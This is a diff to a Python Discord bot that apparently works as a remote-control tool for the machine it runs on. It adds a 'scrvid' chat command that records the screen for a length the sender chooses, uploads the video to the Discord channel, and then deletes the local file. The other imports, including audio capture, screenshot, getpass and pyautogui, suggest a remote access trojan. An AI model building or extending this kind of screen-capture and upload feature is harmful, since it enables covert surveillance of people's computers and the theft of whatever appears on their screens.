@@ -1,3 +1,4 @@
+import numpy as np
 import pyaudio
 import wave
 from PIL import ImageGrab, Image, ImageTk
@@ -6,6 +7,7 @@ import discord
 import asyncio
 import getpass
 import requests
+import imageio
 import pyautogui
 from gtts import gTTS 
 import pygame
@@ -336,7 +338,31 @@ class MyClient(discord.Client):
             if f'{message.content}' == 'min':
                 pyautogui.hotkey('win', 'd')
                 await message.channel.send('Minimized all windows')
+            #record a video of the screen
+            if f'{message.content}' == 'scrvid':
+                await message.channel.send('Please enter the duration of the video you would like to record (in seconds)')
+                def check(m):
+                    return m.author == message.author and m.channel == message.channel
+                msg = await client.wait_for('message', check=check)
+                duration = int(msg.content)
 
+                await message.channel.send('Recording video...')
+
+                # Set up video writer
+                fps = 30
+                writer = imageio.get_writer('output.mp4', fps=fps, codec='libx264', quality=10)
+
+                # Record the screen
+                start_time = time.time()
+                while time.time() - start_time < duration:
+                    screenshot = pyautogui.screenshot()
+                    writer.append_data(imageio.core.util.Array(np.array(screenshot)))
+                    time.sleep(1 / (fps * 5))
+
+                writer.close()
+
+                await message.channel.send(file=discord.File('output.mp4'))
+                os.remove('output.mp4')
         except Exception as e:
             await message.channel.send(f'An error occurred: {str(e)}')
 
